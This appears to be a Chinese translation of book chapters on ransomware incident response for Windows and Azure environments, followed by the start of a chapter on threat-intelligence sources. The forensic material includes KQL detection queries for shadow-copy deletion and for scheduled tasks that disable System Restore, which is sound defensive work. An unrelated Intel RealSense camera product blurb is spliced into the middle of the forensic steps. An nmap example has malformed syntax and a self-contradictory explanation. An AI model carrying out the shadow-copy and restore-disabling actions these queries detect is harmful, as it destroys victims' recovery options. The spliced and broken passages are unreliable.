  \n- 勒索软件取证——以及一旦遭到攻击该怎么做\n- 在文件系统、注册表和基础设施事件中要查找什么\n- 判断勒索软件的类型，并研究最常见的攻击向量\n- 确保在系统恢复运行后移除被利用的入口点\n\
  \n### 你中了勒索软件，现在该怎么办？\n\n如前所述，已有多个案例报告显示，刚从勒索软件攻击中恢复的组织，在初次攻击后仅几天或几周内便再次遭到攻击。\n\n\
  这是因为攻击发生后的主要工作重心放在从备份中恢复系统和基础设施，或重新搭建系统，以确保 IT 系统对最终用户保持可用。问题在于，如果再次发生新的攻击，当你需要重复同样的流程时，所有时间和精力都将付诸东流。\n\
  \n因此，重要的是建立起相应流程，确保你也能查明攻击是如何发生的，并封堵该漏洞或移除相关的攻击向量。\n\n- 使用诸如 ID Ransomware 网站（可在此处找到：https://id-ransomware.malwarehunterteam.com/）之类的服务来验证勒索软件变种。我们可以在此网站上上传受感染机器上生成的示例文本文件。这有助于识别你的基础设施中使用了哪种勒索软件。当我们识别出所使用的勒索软件类型后，可能也会得到一些关于使用了哪种攻击向量的线索。这很有用，因为该服务还会通知你是否存在可用的解密工具。\n\
  - 如果未从 ID Ransomware 网站获得任何信息，请收集受攻击设备上勒索软件创建的文本文件中的网址和参考信息。在大多数情况下，你都能获得关于是哪个勒索软件组织发动了攻击的明确信息。\n\
  - 列出所有应被通知的人员名单，并使用可用的服务（如 Microsoft Teams、Slack 或其他渠道）建立沟通流程。在这些不同阶段，拥有协作手段始终非常重要。\n\
  \n一旦我们验证了事件并收集了有关所面对的是哪种勒索软件攻击的信息，在大多数情况下，互联网上可能会有大量关于所使用的特定勒索软件变种及其典型攻击向量的信息。这些信息有助于更轻松地确定入口点。\n\
  \n### 第二阶段——发现影响范围\n\n一旦我们确认已受到勒索软件攻击，就需要了解攻击的影响范围。有多少终端和服务器已被入侵？\n\n需要注意的是，除了技术调查之外，如果你的组织所在国家是欧盟成员国，因此需要遵守\
  \ GDPR，你还需要立即通知监管机构，最迟不得超过知悉违规后的 72 小时。此外，你还应联系当地有关部门。\n\n以下是涉及的步骤：\n\n- 验证如何判断机器上是否存在勒索软件，可以通过查看桌面背景的变化，或桌面上/机器上的特定文件扩展名来判断。如果某台机器上的文件扩展名已变为\
  \ CRYPT 或其他扩展名，这可能是验证勒索软件变种类型的第一条线索，也是判断机器是否已被入侵的一种方式。请记录下来，并告知员工如何验证他们的机器是否受到了攻击影响。应使用电子邮件以外的渠道通知员工，因为电子邮件服务可能因攻击而不可用。应指定专人负责收集受影响终端员工的信息。这是为了建立攻击时间线——最终用户何时注意到变化——同时记录他们最近是否收到过可疑电子邮件。这些步骤应由服务台处理。你还应准备预定义的模板，用于告知最终用户发生了什么以及他们应该做什么。\n\
  - 重置管理员和用户账户的凭据，尤其是如果你有同步到云服务的账户。这是为了确保即使攻击者获取了用户账户信息，也无法利用这些信息访问其他云服务。如果由于域控制器或身份同步服务不可用而无法重置凭据，至少应限制对云服务的登录访问，直到你能妥善重置凭据。此外，你还应撤销\
  \ Azure AD 中所有用户账户的令牌。这是为了降低攻击者利用凭据访问基于 Azure AD 的服务（如 Microsoft 365）的风险。\n- 在调查阶段，告知最终用户发生了什么以及这对他们的影响。重要的是要用通俗易懂的语言向他们解释，以及这次对\
  \ IT 基础设施的攻击如何影响他们工作和访问内部系统的能力。虽然这些步骤很耗时，但必须确保最终用户理解攻击的后果。如果可能，你还应编写一份简短的常见问题解答，分享给本地服务台。\n\
  - 在禁用出站连接后，登录关键服务器以验证它们是否受到影响。最初的重点应放在域控制器和备份服务器上。其次，应检查文件服务器或其他存储服务是否受到影响。最后，再检查基础设施中的其他各种服务器。如果环境较大且在攻击后可见性有限，则从不同网段中的服务器中抽取一些随机样本来验证影响范围。\n\
  - 如果你能访问 EDR 工具或 SIEM 机制等系统，请尝试扫描具体的失陷指标。如果这些服务不可用，请手动检查文件更改。同时尝试查看不同网络区域或网段中是否有未受影响的系统。这可以让你了解哪些区域是可被访问的。在\
  \ SIEM 和 EDR 工具中，查找*第 1 章*中引用的已知工具和脚本，以寻找失陷指标。EDR 工具还可以用于检查外部通信。一旦确定某个系统已被入侵，请尝试将该系统从网络中隔离，以防止进一步入侵。\n\
  - 检查防火墙或 IDS 日志中是否有通往任何命令与控制服务器的出站流量。在大多数情况下，组织记录网络流量的窗口很短，因此务必确保攻击发生时间窗口内的日志不会被新流量覆盖。尝试将日志导出到可用于检查的干净系统中。\n\
  - 检查防火墙/IDS 日志中是否有任何数据外泄的迹象，这一点也很重要。根据你所拥有的供应商和可见性不同，通常最容易的方法是检查是否在大量数据出站流量中出现了不熟悉的\
  \ IP 地址。某些防火墙供应商还能提供更深入的可见性，使你能够了解是否存在高数据出站流量，并显示使用了哪种协议和哪个 IP。在大多数涉及数据外泄的勒索软件案例中，攻击者要么使用\
  \ HTTPS，要么使用 FTP，这正是你应当关注的。另外，请记住\n\n\n大多数防火墙日志的保留期很短，因此请务必尝试导出一份防火墙日志的副本，以供后续进一步检查。\n\
  \n- 检查在上一次备份之前数据是否已遭到破坏。通过将最后一次成功的备份还原到隔离环境中，您可以验证数据的完整性。必须将其设置在隔离环境中，以确保备份数据不会遭到破坏。大多数攻击发生在夜间，有时您可能恰好在攻击发生前的夜间成功完成备份，这样可以最大限度地减少数据丢失。部分勒索软件攻击在初始加密过程之前还会使用\
  \ Windows 中的 vssadmin 工具来删除所有卷影副本并修改服务，这可能会影响系统备份。如果您在备份服务中发现某些服务器昨晚未能成功备份，这可能表明这些服务器首先被感染了。\n\
  \n那么，如果攻击期间我们所有的服务器、终端用户计算机和备份数据都已遭到入侵，该怎么办？幸运的是，我们有异地备份，其中包含一些近期数据，或者我们的大部分业务数据存储在公有云中，例如电子邮件/文件/ERP\
  \ 系统。如果没有，那选择就非常有限。您可以检查是否存在针对特定勒索软件变种的解密工具。\n\n如果您正在与攻击者谈判，并要求他们提供备份服务器的解密密钥以测试解密工具，他们很可能会直接拒绝，并索要更高的价格。有一次，我很幸运，成功与勒索软件运营者协商，获得访问其中一台服务器的权限，以检查解密工具是否有效，而那台服务器恰好是包含所有备份数据的备份服务器。随后我得以从备份中恢复数据。\n\
  \n我之所以能够做到这一点，是因为勒索软件运营者对该环境中使用的备份工具并不熟悉，因为该备份产品并非知名品牌。其次，该服务器的名称并没有反映出它是一台备份服务器。因此，我运气不错，而且我们在收集到的网络日志中也看到，数据很可能并未被泄露。\n\
  \n勒索软件运营者会为每台被加密的服务器收集元数据，因为每台服务器都有自己唯一的加密密钥。这是为了确保您无法在多个服务器上使用相同的解密工具。有时，他们可能会给您一个可用于解密测试服务器或某些文件的工具，只是为了向您证明解密工具是有效的。\n\
  \n## 第三阶段——了解攻击途径以及需要关注的内容\n\n一旦我们确定了所使用的勒索软件变种，并判断出攻击影响了多少系统和终端，下一步就是尝试弄清楚攻击是如何发生的。\n\
  \n例如，如果我们确定我们受到 Quantum 勒索软件的入侵，我们可以通过 ID Ransomware 服务或在受害机器上发现的勒索文本文件中的证据来验证这一点。然后，我们查看互联网上公开可用的相关信息，了解勒索软件通常使用哪些机制来获得访问权限。\n\
  \n在查看公开信息后，我们得知 Quantum 主要以钓鱼邮件作为初始攻击途径。接下来，如果没有用户报告可疑邮件，我们需要检查是否有任何日志可以表明在过去 24\
  \ 小时内是否有人在其机器上打开了附件。\n\n当然，这一步取决于您是否能够轻松访问服务的电子邮件流量日志。例如，如果您同时使用了 Microsoft Defender\
  \ for Endpoint 和 Microsoft Defender for Office，您会有审计日志，可以从中检查是否存在包含恶意附件的钓鱼邮件的迹象。\n\
  \n通过使用 Microsoft Sentinel Kusto 查询（如下代码示例所示），我们可以轻松找出过去 24 小时内通过电子邮件发送到我们组织的附件类型：\n\
  \n```\n```kusto\nEmailAttachmentInfo| where SenderFromAddress !contains\n\"nameofinternaldomain.com\"\
  \n| summarize count() by FileType\n```\n```\n\n这将针对 EmailAttachmentInfo 日志源表运行查询，该表包含发送到我们组织的所有带附件电子邮件的日志。最初，我们可以选择通过应用筛选器将内部发件人从结果中排除。最后，我们可以通过按文件类型对传输的文件进行分类来汇总结果。\n\
  \n我们应该重点关注的是压缩文件或具有异常类型的文件，例如 .lnk、.exe 或其他类型。\n\n我们还可以添加额外的筛选器，排除我们认为无需进一步调查的文件类型，例如\
  \ .png、.jpeg 和 .pdf 文件，因此筛选器将如下所示：\n\n```\n```kusto\nEmailAttachmentInfo\n| where\
  \ SenderFromAddress !contains \" nameofinternaldomain.com\n\"\n| where FileType\
  \ !contains \"png\" and FileType !contains \"jpeg\"\n| summarize count() by FileType\n\
  ```\n```\n\n现在，我们已经将范围缩小到少数我们认为可疑、需要进一步调查的事件。这个审计日志的一个问题是它只跟踪带附件的电子邮件，并不能为我们提供任何关于用户实际上是否在其计算机上点击并打开了附件的指示。\n\
  \n下一步是查看个人收到带有恶意附件的电子邮件并打开该内容后发生了什么。这也要求我们从用户的设备上收集日志，以便查看用户打开附件后操作系统上发生的事件时间线。\n\
  \n同样，这取决于您的组织使用哪种安全产品。在本示例中，我将使用 Microsoft Defender for Endpoint，它会从已载入的终端收集此类数据。首先要做的就是尝试找出用户在收到附件时使用的是哪台设备。\n\
  \n在这里，您还可以使用 Microsoft Defender for Endpoint 的审计日志来检查登录事件，这些事件可以指示用户登录了哪台设备。以下是一个自定义查询示例，通过输入用户名，即可找到用户登录过的计算机：\n\
  \n```\nDeviceInfo\n| where LoggedOnUsers[0].UserName == \"username\"\n```\n\n从这里，我们可以看出用户在过去两个月中是否使用过某台特定设备。下一步是查看从打开电子邮件附件到首次攻击发生之间，机器上发生了哪些进程或变化。\n\
  \n## 手动处理方式\n\n在某些情况下，我们可能无法获得同等的可见性，因为我们的终端上可能没有安装这些类型的 EDR 产品。这就需要我们采用更手动的方法来处理此过程。\n\
  \n我们需要检查一些主要内容，以尝试寻找证据：\n\n- 本地文件系统和运行内存\n- 事件日志\n- 任务计划程序和 BITS\n- 注册表更改\n- 来自安全产品（如\
  \ Microsoft Defender 或第三方安全工具）的证据\n\n希望您能大致了解是哪个用户打开了附件，以及该计算机是否仍使用该用户的凭据登录，这样您就能洞察机器上正在运行的任何内容。\n\
  \n如果用户已注销或停止了机器，您应尝试使用本地管理员帐户（如果有的话）登录该机器；只需确保该机器未连接到网络即可。\n\n您需要从很多地方开始深入检查机器，以尝试弄清楚发生了什么。首先，检查是否有任何安全产品检测到威胁，以及已采取了哪些操作。在大多数勒索软件攻击中，攻击者通常会先禁用任何安全产品，因此您通常不太可能在那里找到任何东西。\n\
  \n\n\n第一步是检查操作系统上是否有不需要的或异常的文件夹：\n\n- C:\\users\\download（用于ISO文件、ZIP文件或INK文件）–\
  \ 同时检查当前机器上是否有已挂载的文件\n- C:\\windows\\temp（用于.exe或.bat脚本）\n- C:\\users\\username\\\
  appdata\\local\\temp（用于.exe或.bat脚本）\n- C:\\ – 如果这里有任何时间戳较新的文件夹，大多数情况下，攻击者会创建一个临时文件夹，用于存放他们使用的脚本和漏洞利用工具。\n\
  \n根据此处使用的勒索软件变种，有时在其他文件中可能找不到任何线索，因为攻击者在开始加密过程之前已经删除了所有痕迹。此外，在初始侦查阶段使用的文件夹也可能因勒索软件变种而异。\n\
  \n如果我们在那里没有找到任何东西，第二步是尝试在事件查看器中查找异常事件，这可能会给我们提供一些线索。在以下示例中，我们有一个通过电子邮件发送的ISO文件传递的有效载荷，用户打开并执行了该恶意软件。\n\
  \nWindows会在事件查看器中记录ISO挂载事件，使用Event ID 12，日志位于Microsoft-Windows-VHDMP-Operational.evtx，如下面的截图所示：\n\
  \n![](img/7b49a27a3c2adc52d097f2e77f3bf394_230_0.png)\n\n图8.1 – 机器上挂载的VHD文件\n\n\
  此外，你还应查找以下事件ID：\n\n- 1000 – 应用程序错误\n- 1 – 服务启动\n- 1102 – 审核日志已清除\n- 1116 – Microsoft\
  \ Defender 防病毒软件检测到恶意软件\n- 1117 – Microsoft Defender 防病毒软件已采取恶意软件操作\n- 4624 – 网络登录（通常表示RDP登录）\n\
  - 4688 – 进程创建事件\n- 4700 – 已启用计划任务\n- 7045 – 系统中安装了新服务\n\n勒索软件也可能使用不同的机制来维持持久访问，因此检查是否存在异常的计划任务和BITS任务也很重要。首先，我们可以在事件查看器的Microsoft-Windows-Task-Scheduler/Operational事件日志下检查计划任务是否有任何更改。\n\
  \n> **注意**\n> 你可以通过查看安全日志中的事件ID 1102来检查事件日志是否已被清除。攻击者通常会这样做以清除证据，这通常是在加密过程开始之前做的最后几件事之一。\n\
  \n如果事件日志已被清除，我们可以使用以下PowerShell命令检查计划任务：\n\n```\nGet-ScheduledTask | format-list\n\
  ```\n\n或者，你可以使用任务计划程序应用程序来更直观地查看不同的任务。以下示例显示了一个每5分钟运行一次的计划任务，它是STOP/DJVU勒索软件的一部分：\n\
  \n![](img/7b49a27a3c2adc52d097f2e77f3bf394_231_0.png)\n\n图8.2 – 任务计划程序显示一个用于维持持久访问的任务\n\
  \n介绍 Intel RealSense LiDAR Camera L515，它是一款具有高精度depth感知、适用于室内应用的小型深度摄像头。\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_232_0.png)\n\
  \n## 主要特点\n\n- 高精度深度感知\n- 小型轻量化设计\n- 适用于室内应用\n- 支持多种开发平台\n\n## 技术参数\n\n| 参数 | 规格\
  \ |\n| --- | --- |\n| 深度分辨率 | 1024×768 |\n| 深度帧率 | 30 fps |\n| 测量范围 | 0.25m - 9m\
  \ |\n| 接口 | USB 3.0 |\n\n我们可以查找作为发起进程的计划任务：\n\n```\nDeviceProcessEvents\n| where\
  \ FileName =~ \"schtasks.exe\"\n| project Timestamp, DeviceName\n```\n\n此外，如果攻击者使用了其他发起进程来设置计划任务，我们可以从注册表更改中寻找指标：\n\
  \n```\nDeviceRegistryEvents\n| where ActionType == @\"RegistryKeyCreated\"\n| where\
  \ RegistryKey startswith @\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\\
  CurrentVersion\\Schedule\\TaskCache\\Tree\\\"\n| project Timestamp, DeviceName,\
  \ ActionType, InitiatingProcessFileName, RegistryKey\n```\n\n通过在Microsoft Defender\
  \ for Endpoint中运行某些查询，可以确定系统中是否添加了计划任务。虽然可能需要进一步调查注册表以确定该任务的目的，但Microsoft Defender\
  \ for Endpoint也可用于检测其他已知的恶意活动，例如禁用系统还原或删除备份副本的任务。这可能表明系统存在潜在的安全威胁：\n\n```\nDeviceProcessEvents\n\
  | where FileName =~ \"wmic.exe\"\n| where ProcessCommandLine has \"shadowcopy\"\
  \ and ProcessCommandLine has \"delete\" | project DeviceId, Timestamp, InitiatingProcessFileName,\
  \ FileName, ProcessCommandLine, InitiatingProcessIntegrityLevel, InitiatingProcessParentFileName\n\
  DeviceProcessEvents\n| where InitiatingProcessFileName =~ 'rundll32.exe' and InitiatingProcessCommandLine\
  \ !contains \" \" and InitiatingProcessCommandLine != \"\" and FileName in~ ('schtasks.exe')\
  \ and ProcessCommandLine has 'Change' and ProcessCommandLine has 'SystemRestore'\
  \ and ProcessCommandLine has 'disable'\n```\n\n上述示例将对所有已收集信息的设备运行查询。你还可以添加一个过滤器，仅针对特定设备运行查询，例如在查询中使用以下附加行：\n\
  \n```\n| where DeviceName == \"nameofdevice\"\n```\n\n一旦我们获得了关于哪些组策略被更改以及哪些设置被更改的信息，我们应该尝试撤销这些设置。然而，在大多数情况下，我见过攻击者使用脚本自动创建应用所有这些设置的新组策略，因此删除这些策略应该能恢复大部分更改。\n\
  \n## 封堵入口\n\n虽然我们主要关注如何分析勒索软件变种，但我们还需要确保能够封堵攻击者利用的入口，以免再次成为同一手法的受害者。\n\n以我之前提到的Quantum勒索软件为例，他们的主要攻击向量往往是钓鱼邮件。然而，如果我们遭受其他方式的攻击怎么办？\n\
  \n时间线是理解攻击起源的重要工具。在从用户账户和日志中收集证据时，创建一条追踪可能表明初始受损的最早事件的时间线非常重要。为此，请考虑主要的入侵方法，并回溯以确定攻击可能如何发生：\n\
  \n- 终端用户工作站\n- 公开可用的错误配置服务器\n- 外部服务上的零日漏洞\n\n如果初始入侵是通过发送给终端用户的钓鱼邮件发生的，那么确定使用了哪种附件在终端用户的机器上启动恶意软件加载程序非常重要。这些信息有助于识别攻击来源，并了解攻击者是如何进入系统的。\n\
  \n首先，你需要执行以下操作：\n\n- 阻止发件人和来自该特定域名的电子邮件。这只是一个临时解决方案，因为许多钓鱼域名的生命周期很短。\n- 如果发送的附件使用了不常用的畸形附件类型，请在电子邮件服务中阻止该附件类型。\n\
  - 如果攻击使用了已知的文档附件，例如.docx或.xlsx，我们需要分析该附件。将包含恶意文档的附件上传到virustotal.com等分析网站。例如，这里有一个VirusTotal报告，显示了与Microsoft\
  \ Office中名为Follina的零日漏洞相关的分析，可以让我们了解VirusTotal的一些功能：https://www.virustotal.com/gui/file/4a24048f81afbe9fb62e7a6a49adbdlfaf41f266b5f9feecdceb567aec096784/detection。\n\
  - 一旦你知道使用了哪个漏洞，你需要了解如何修复该漏洞。对于Follina漏洞，微软提供了一个软件更新，可以消除滥用该漏洞的可能性，如这里所述：https://msrc-blog.microsoft.com/2022/05/30/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/。\n\
  \n需要注意的是，终端应自动安装操作系统、浏览器和Office产品的最新安全补丁。这样就能封堵攻击者利用该漏洞的入口。\n\n现在，如果攻击不是从终端用户开始的，而是从一个错误配置的服务开始的，例如一个通过RDP公开的服务器，该怎么办？需要注意的是，微软在Microsoft\
  \ Azure中看到的最常见入口点之一是具有公共IP并开放RDP的服务器。\n\n要检测哪些服务和端口是公开可用的，必须绘制出可从互联网访问的服务。这有助于识别任何漏洞或潜在安全风险。\n\
  \n查看防火墙可能会根据你使用的供应商提供一些有用的指示，但有时，为了进一步确认，我倾向于使用Nmap等工具对组织公共IP范围进行简单的端口扫描。\n\n你可以从这里下载Nmap\
  \ - https://nmap.org/download.html - 这是一个CLI工具，可使用以下命令轻松扫描IP范围：\n\n```\nNmap -Pn\
  \ 192.168.0-200\n```\n\n这将对192.168.0.0到192.168.0.200之间的整个网络进行端口扫描。-Pn选项告诉Nmap假设主机在线并跳过主机发现。它将对192.168.0-200的IP地址范围执行ping扫描，这是C类网络的私有IP地址范围。它将扫描网络上的所有主机，并尝试绘制网络地图，识别主机、操作系统及其上运行的服务。另一种选择是使用Microsoft外部攻击面管理或Shodan等工具，这些工具也可以进行更深入的扫描。\n\
  \n如果你发现一台服务器开放了RDP等服务，你应该查看从该服务器收集的日志，检查安全日志中是否有任何身份验证尝试，这些尝试可能表明系统已受损。如果你为该服务器启用了Sentinel，可以使用以下KQL查询来查找RDP暴力破解攻击：\n\
  \n```\nSecurityEvent\n| summarize\nLOGONFAILED=countif(EventID == \"4625\"),\nby\
  \ IpAddress, Computer\n```\n\n如果你发现此查询中的服务器有大量失败的登录尝试，这很可能表明该机器遭受了暴力破解攻击。还应注意，如果你使用公共云服务托管虚拟机，你可能还需要检查云提供商提供的公共IP地址，以确认服务是否可从外部访问。\n\
  \n\n\n\n> **注意**\n> \n> 本书官方 GitHub 仓库中提供了更多使用 Kusto 检测入侵的示例，可在此处找到：`https://github.com/PacktPublishing/Windows-Ransomware-Detection-and-Protection`。\n\
  \n第一个攻击场景可能涉及钓鱼攻击，而第二个场景可能涉及针对配置错误服务的暴力破解攻击。\n\n在第三种场景中，可公开访问的服务可能用于合法目的，例如 VPN、远程工作和\
  \ Web 应用程序。然而，仍有可能利用零日漏洞或现有漏洞来获取对您基础设施的访问权限。定期审查和评估这些服务以确保其安全非常重要。\n\n了解可公开访问的外部服务也很重要，例如用于网站的服务。例如，正在使用的服务和框架的映射可能包括以下内容：\n\
  \n- VPN（Fortinet）\n- VDI（VMware Horizon）\n- Web 应用程序（IIS 和 Apache），主要使用 .NET 应用程序\n\
  - 运行旧版 Java 的 Web 应用程序，用于 ERP 系统\n- 电子邮件（Microsoft Exchange）\n\n虽然可能很难确定是否使用了漏洞利用，但首先要确定每个服务的软件版本类型，并确保它们已更新到最新版本。如果没有，请确保它们运行的是最新版本，如果您怀疑其中一个外部服务存在初始入侵，请尝试查找有关该漏洞的更多信息以及缓解方法。\n\
  \n例如，CIS 维护着一个正在被利用的已知漏洞的最新列表，网址为 `https://www.cisa.gov/known-exploited-vulnerabilities-catalog`，在您绘制服务地图后也可以将其用作来源。\n\
  \n## 摘要\n\n在本章中，我们了解了更多关于如何处理潜在攻击、如何将攻击划分为不同阶段、我们应如何在组织内部和向当局通报，以及一些寻找入侵技术证据的方法。\n\
  \n需要注意的是，本章提到的技术只是常用的方法中的几个例子。有效 IT 安全的关键在于拥有在需要时提供洞察的正确工具，以及及时了解最新的漏洞和攻击方法。威胁形势不断变化，因此跟踪当前威胁至关重要。这将在下一章中进一步讨论。\n"
- '## 监控威胁形势


  威胁形势不断演变，因此 IT 领域的所有人员都必须拥有工具和新闻来源，以便轻松及时了解当前威胁。


  在本章中，我想提供一些建议，说明您如何使用不同的在线来源和流程来监控未来威胁的威胁形势，以帮助您保持最新状态。


  本章还提供了我们过去一年所看到的趋势的见解，以及保护工作负载免受未来威胁将重要的因素。


  在本章中，我们将涵盖以下主题：


  - 如何监控威胁形势

  - 建立流程以确保威胁得到处理

  - 未来会怎样？


  ## 如何监控威胁形势


  作为一名 IT 专业人员，我花费大量时间收集和处理信息，因此拥有工具来轻松聚合合适的信息和新闻水平非常重要。当然，收集信息的方式有很多，这里我只分享我个人收集信息的一些不同方式。


  我使用的主要工具之一是 Feedly，这是一项用于使用 RSS 聚合来自不同来源的 feed 的服务。Feedly 使用简单，因此您可以轻松添加新的网站作为数据源，并且个人账户免费使用。


  您可以使用社交账户在 feedly.com 免费注册 Feedly。注册后，您必须添加要关注的来源，可以通过添加单个页面或添加一堆不同来源来添加。您可以通过单击左侧的
  **Following website** 按钮并将网站 URL 添加到搜索面板，然后按 *Enter* 来添加单个来源。然后您将看到您搜索的网站，如下图所示：


  ![](img/7b49a27a3c2adc52d097f2e77f3bf394_240_0.png)


  图 9.1 – 使用 Feedly 通过 RSS 收集网站更新


  然后，您单击 **FOLLOW** 按钮将其添加为新闻来源。除了添加单个站点外，您还可以通过访问以下地址添加捆绑包：https://feedly.com/i/discover/sources/search/topic/cybersecurity。


  在这里，您有一个可以关注的不同来源列表，以便轻松获取与安全新闻和更新相关信息。


  此外，Feedly 还具有名为 Leo 的 AI 引擎，它还可以帮助减少重复信息的杂乱，对于威胁情报信息收集也非常有用。有了 Leo，您可以使用不同的预定义集合来从大量开放源收集信息，如下图所示：


  ![](img/7b49a27a3c2adc52d097f2e77f3bf394_241_0.png)


  图 9.2 – Feedly 和 Leo 网络警报配置


  因此，例如，我可以监控具有高漏洞评分的来源，并在此处直接获取聚合源。替代方案是直接访问每个网站并将每个来源添加到 Feedly 的主 RSS 引擎，通过其他来源通过电子邮件获取信息，甚至手动访问每个站点获取信息。


  您还可以定义不同的过滤器，例如 AND/OR，这使我们能够收集与我们基础设施中产品相关的漏洞数据，无论是 VMware、Veeam、Citrix 还是 Microsoft。


  我们还可以在不访问网站的情况下将相关信息和文章直接转发到 Teams 或 Slack。需要注意的是，Leo 的功能以及将事件转发到 Teams/Slack 的能力仅在
  Feedly 的企业版中可用，每位用户每月费用约为 12 美元。


  此外，我个人也大量使用 Twitter 来收集威胁信息。与 Feedly 相比，Twitter 的缺点是作为社交媒体平台会有更多噪音。然而，我使用它不仅仅是为了获取威胁信息；它也有助于获取研究、其他相关新闻或故障排除问题的信息。


  在 Twitter 上，您还可以创建包含预定义人员或频道的列表以供关注。但是，这需要您过滤大量噪音。更好的选择是使用不同的搜索运算符来收集可能有用的信息：


  | 搜索运算符 | 查找的推文 |

  |---|---|

  | CVE Microsoft | 同时包含 CVE 和 Microsoft。这是默认运算符。 |

  | "Office Zeroday" | 包含确切短语 – Office Zeroday。 |

  | ransomware OR cve | 包含 ransomware 或 cve（或两者）。 |

  | ransomware -cve | 包含 ransomware 但不包含 cve。 |

  | #Zerologon | 包含 Zerologon 标签。 |


  表 9.1 – 显示 Twitter 的不同搜索运算符


  需要注意的是，许多信息安全社区的人也转向了 Mastodon，这是一个 Twitter 的替代品，例如 Infosec Mastodon 网络：https://infosec.exchange/。


  此外，您还有其他更官方的来源可用于收集与新漏洞相关信息，例如以下内容：


  - Microsoft Security Response Center：https://msrc-blog.microsoft.com/

  - Cisco Talos Intelligence：https://talosintelligence.com/vulnerability_info

  - VMware Security Response Center：https://www.vmware.com/security/vsrc.html


  您还有更多厂商中立的网站也积极监控新漏洞，例如网络安全和基础设施安全局（CISA），它还监控已知被利用的漏洞：https://www.cisa.gov/known-exploited-vulnerabilities-catalog。


  微软最近基于其在 2021 年收购的公司 RiskIQ 引入了几项新服务。此次收购后发布的产品之一是 Microsoft Defender Threat Intelligence，如果您拥有
  Microsoft 365 许可证，可以在此处访问：https://ti.defender.microsoft.com/。


  该服务提供不同的 SKU。您有免费选项和付费选项，后者按用户每年收费。虽然付费版本提供有关漏洞和指标的更丰富信息，但免费版本也可用于查找漏洞以及与 IP 地址相关信息。


  例如，如果我输入 PrintNightmare 的 CVE ID，我可以获得有关该漏洞的详细信息，如下图所示：




  ## 图 9.3 – 来自 Microsoft Defender Threat Intelligence 的 CVE 信息


  然而，我在此列出的大部分资源只是获取与威胁态势相关的信息和新闻的方式。最重要的一点是能够获得与您自己的环境和基础设施相关的洞察和信息。也就是说，能够看到哪些类型漏洞可能会影响您的环境和服务。


  也有云服务可以用于从外部视角监控和查找服务及漏洞，就像任何攻击者一样。这些服务还可以将这些外部服务与漏洞进行映射。


  在这里，我们有 Shodan.io 等选项，可用于单独搜索外部服务或设置自定义监控。


  例如，我可以搜索特定漏洞并将搜索映射到特定组织或国家：


